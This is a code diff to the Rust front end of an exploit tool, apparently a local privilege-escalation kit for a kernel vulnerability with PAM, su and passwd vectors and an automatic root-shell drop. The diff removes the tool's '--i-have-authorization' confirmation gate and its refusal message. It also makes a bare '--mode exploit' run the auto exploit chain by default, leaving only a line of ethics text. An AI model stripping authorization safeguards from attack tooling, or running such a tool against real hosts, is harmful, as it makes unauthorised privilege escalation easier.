@@ -28,7 +28,7 @@ pub extern "C" fn rust_eh_personality() {}
 const USAGE: &[u8] = b"copyfail-rs (CVE-2026-31431)\n\
 Usage:\n\
   copyfail --check\n\
-  copyfail --mode exploit --vector <pam|su|passwd|auto|all|list> [opts]\n\
+  copyfail --mode exploit [--vector <pam|su|passwd|auto|all|list>] [opts]\n\
   copyfail --mode detect --check [--json]\n\
   copyfail --mode detect --scan [--json] [PATH ...]\n\
   copyfail --mode detect --baseline FILE [PATH ...]\n\
@@ -38,15 +38,16 @@ Usage:\n\
   copyfail --help\n\
 \n\
 Exploit-mode options:\n\
-  --vector NAME           pam | su | passwd | auto | all | list\n\
-  --i-have-authorization  Required for any execution path (auto/all/named).\n\
-                          --vector list and --dry-run do not require it.\n\
+  --vector NAME           pam | su | passwd | auto | all | list (default: auto)\n\
   --dry-run               Print the plan, do not exploit. Exit 0.\n\
   --strict                Exit non-zero if any vector failed, even on success.\n\
   --json                  Emit machine-readable JSON.\n\
   --no-shell              Suppress PAM auto-shell drop; print manual hint.\n\
-  --target USER           Reserved for passwd vector (S4: parse-only, deferred).\n\
-  --shell PATH            Reserved for shell payload override (S4: parse-only, deferred).\n";
+  --target USER           Reserved for passwd vector (parse-only, deferred).\n\
+  --shell PATH            Reserved for shell payload override (parse-only, deferred).\n\
+\n\
+Authorization & ethics: see README and LICENSE. Run only on systems you own\n\
+or have written permission to test.\n";
 
 #[no_mangle]
 #[allow(clippy::not_unsafe_ptr_arg_deref)]
@@ -73,7 +74,6 @@ enum DetectSub { None, Check, Scan, Baseline, Diff, Watch, Hunt }
 struct Args {
     cmd: Cmd,
     vector: VectorChoice,
-    authorized: bool,
     detect_sub: DetectSub,
     json: bool,
     strict: bool,
@@ -90,7 +90,6 @@ impl Args {
         Args {
             cmd: Cmd::Help,
             vector: VectorChoice::None,
-            authorized: false,
             detect_sub: DetectSub::None,
             json: false,
             strict: false,
@@ -113,15 +112,17 @@ impl Args {
         while (i as i32) < argc {
             let arg = *argv.offset(i);
             if cstr_eq(arg, b"--help\0") || cstr_eq(arg, b"-h\0") {
+                // --help wins regardless of position. Short-circuit so the
+                // post-loop default-vector tail can't fire for an arg list
+                // like `--help --mode exploit`.
                 a.cmd = Cmd::Help;
+                return a;
             } else if cstr_eq(arg, b"--check\0") {
                 if matches!(a.cmd, Cmd::Detect) {
                     a.detect_sub = DetectSub::Check;
                 } else {
                     a.cmd = Cmd::Check;
                 }
-            } else if cstr_eq(arg, b"--i-have-authorization\0") {
-                a.authorized = true;
             } else if cstr_eq(arg, b"--mode\0") {
                 i += 1;
                 if (i as i32) >= argc { a.cmd = Cmd::Bad; return a; }
@@ -195,6 +196,13 @@ impl Args {
             }
             i += 1;
         }
+        // --mode exploit with no --vector flag defaults to auto. The
+        // operator's intent is unambiguous: "exploit this host"; auto-select
+        // is the only sensible default. --vector list still requires explicit
+        // opt-in (it does not exploit).
+        if matches!(a.cmd, Cmd::Exploit) && matches!(a.vector, VectorChoice::None) {
+            a.vector = VectorChoice::Auto;
+        }
         a
     }
 }
@@ -246,28 +254,18 @@ fn run_check() -> i32 {
 // ----- Exploit dispatch ---------------------------------------------------
 
 fn run_exploit(args: &Args) -> i32 {
+    // Defensive: parse() sets vector to Auto when --mode exploit is given
+    // without --vector. None here means a programming error upstream.
     if matches!(args.vector, VectorChoice::None) {
-        write_stderr(b"--mode exploit requires --vector <pam|su|passwd|auto|all|list>\n");
-        return 2;
+        write_stderr(b"--mode exploit: vector unresolved (parser bug)\n");
+        return 1;
     }
 
-    // List + dry-run paths are exempt from the authorization gate (no
-    // execution side effects).
     if matches!(args.vector, VectorChoice::List) {
         return run_list(args);
     }
     if args.dry_run {
         return run_dry_run(args);
-    }
-
-    if !args.authorized {
-        write_stderr(
-            b"REFUSED: this is exploit mode. Authorization confirmation required.\n\
-              Re-run with --i-have-authorization to proceed.\n\
-              This tool exists for purple team / detection engineering on owned hardware.\n\
-              Do not run against systems you do not have written authorization to test.\n",
-        );
-        return 2;
     }
 
     // Kernel-vuln pre-check. Spec: 'host not vulnerable' → exit 3.
@@ -282,8 +280,11 @@ fn run_exploit(args: &Args) -> i32 {
         VectorChoice::Passwd => run_named_vector(args, "passwd"),
         VectorChoice::Auto => run_auto(args),
         VectorChoice::All => run_all(args),
-        VectorChoice::List => 0,   // handled above
-        VectorChoice::None => 2,   // handled above
+        // List + None handled by the early returns at the top of this fn.
+        VectorChoice::List | VectorChoice::None => {
+            write_stderr(b"--mode exploit: dispatch fell through (programmer error)\n");
+            1
+        }
     }
 }
 
@@ -346,7 +347,7 @@ fn emit_list_human(plan: &[orchestrator::PlanEntry], host_vuln: bool) {
     if first {
         write_stdout(b"(none applicable)");
     }
-    write_stdout(b"\nRun with --vector auto --i-have-authorization to execute the recommended chain.\n");
+    write_stdout(b"\nRun with --vector auto (or `--mode exploit` with no flags) to execute the recommended chain.\n");
 }
 
 fn emit_list_json(plan: &[orchestrator::PlanEntry], host_vuln: bool) {
